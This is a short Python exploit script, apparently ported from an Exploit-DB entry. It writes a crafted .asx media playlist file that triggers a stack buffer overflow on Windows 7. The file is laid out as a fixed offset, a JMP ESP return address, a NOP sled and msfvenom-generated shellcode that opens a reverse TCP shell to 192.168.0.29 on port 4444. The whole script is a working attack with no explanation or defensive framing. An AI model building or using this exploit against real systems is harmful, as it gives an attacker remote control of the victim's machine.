#!/usr/bin/python

#Exploit 38457, https://www.exploit-db.com/exploits/38457
#Ported exploit to Python, tested on Windows 7

import os
import struct

prefix = ""
offset = 248
overflow = "A" * offset
retn= struct.pack('<L', 0x1003789d)      #RET Address   = 0x1003789d : "\xFF\xE4"
padding = "\x90" *40

#payload
#msfvenom -p windows/x86/shell_reverse_tcp lhost=192.168.0.29 lport=4444 exitfunc=thread -f python -b "\x00\x09\x0a\xa0"

buf =  b""
buf += b"\xbe\x32\xf1\xaf\xbe\xdb\xd6\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x52\x31\x73\x12\x83\xc3\x04\x03\x41\xff\x4d"
buf += b"\x4b\x59\x17\x13\xb4\xa1\xe8\x74\x3c\x44\xd9\xb4\x5a"
buf += b"\x0d\x4a\x05\x28\x43\x67\xee\x7c\x77\xfc\x82\xa8\x78"
buf += b"\xb5\x29\x8f\xb7\x46\x01\xf3\xd6\xc4\x58\x20\x38\xf4"
buf += b"\x92\x35\x39\x31\xce\xb4\x6b\xea\x84\x6b\x9b\x9f\xd1"
buf += b"\xb7\x10\xd3\xf4\xbf\xc5\xa4\xf7\xee\x58\xbe\xa1\x30"
buf += b"\x5b\x13\xda\x78\x43\x70\xe7\x33\xf8\x42\x93\xc5\x28"
buf += b"\x9b\x5c\x69\x15\x13\xaf\x73\x52\x94\x50\x06\xaa\xe6"
buf += b"\xed\x11\x69\x94\x29\x97\x69\x3e\xb9\x0f\x55\xbe\x6e"
buf += b"\xc9\x1e\xcc\xdb\x9d\x78\xd1\xda\x72\xf3\xed\x57\x75"
buf += b"\xd3\x67\x23\x52\xf7\x2c\xf7\xfb\xae\x88\x56\x03\xb0"
buf += b"\x72\x06\xa1\xbb\x9f\x53\xd8\xe6\xf7\x90\xd1\x18\x08"
buf += b"\xbf\x62\x6b\x3a\x60\xd9\xe3\x76\xe9\xc7\xf4\x79\xc0"
buf += b"\xb0\x6a\x84\xeb\xc0\xa3\x43\xbf\x90\xdb\x62\xc0\x7a"
buf += b"\x1b\x8a\x15\x2c\x4b\x24\xc6\x8d\x3b\x84\xb6\x65\x51"
buf += b"\x0b\xe8\x96\x5a\xc1\x81\x3d\xa1\x82\x6d\x69\xa9\x4f"
buf += b"\x06\x68\xa9\x7e\x8a\xe5\x4f\xea\x22\xa0\xd8\x83\xdb"
buf += b"\xe9\x92\x32\x23\x24\xdf\x75\xaf\xcb\x20\x3b\x58\xa1"
buf += b"\x32\xac\xa8\xfc\x68\x7b\xb6\x2a\x04\xe7\x25\xb1\xd4"
buf += b"\x6e\x56\x6e\x83\x27\xa8\x67\x41\xda\x93\xd1\x77\x27"
buf += b"\x45\x19\x33\xfc\xb6\xa4\xba\x71\x82\x82\xac\x4f\x0b"
buf += b"\x8f\x98\x1f\x5a\x59\x76\xe6\x34\x2b\x20\xb0\xeb\xe5"
buf += b"\xa4\x45\xc0\x35\xb2\x49\x0d\xc0\x5a\xfb\xf8\x95\x65"
buf += b"\x34\x6d\x12\x1e\x28\x0d\xdd\xf5\xe8\x2d\x3c\xdf\x04"
buf += b"\xc6\x99\x8a\xa4\x8b\x19\x61\xea\xb5\x99\x83\x93\x41"
buf += b"\x81\xe6\x96\x0e\x05\x1b\xeb\x1f\xe0\x1b\x58\x1f\x21"



postfix = "C" * (1000-248-4-40-len(buf))

buffer = prefix + overflow + retn + padding + buf + postfix

f = open("exploit.asx",'wb')
f.write(buffer)
f.close()
